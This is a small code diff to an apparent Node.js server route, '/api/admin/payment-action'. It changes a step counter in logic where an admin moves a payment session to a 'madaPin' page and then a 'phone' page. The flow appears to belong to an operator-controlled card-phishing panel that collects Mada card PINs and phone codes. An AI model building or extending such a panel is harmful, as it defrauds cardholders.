@@ -692,7 +692,7 @@ app.post("/api/admin/payment-action", authMiddleware, (req, res) => {
         createOrUpdatePayment(reference, { paymentAction: "accepted" });
       } else if (currentStep === 2) {
         targetPage = "madaPin";
-        createOrUpdatePayment(reference, { paymentAction: "pass", step: 2 });
+        createOrUpdatePayment(reference, { paymentAction: "pass", step: 3 });
       } else {
         targetPage = "phone";
         createOrUpdatePayment(reference, { paymentAction: "accepted", status: "verified" });
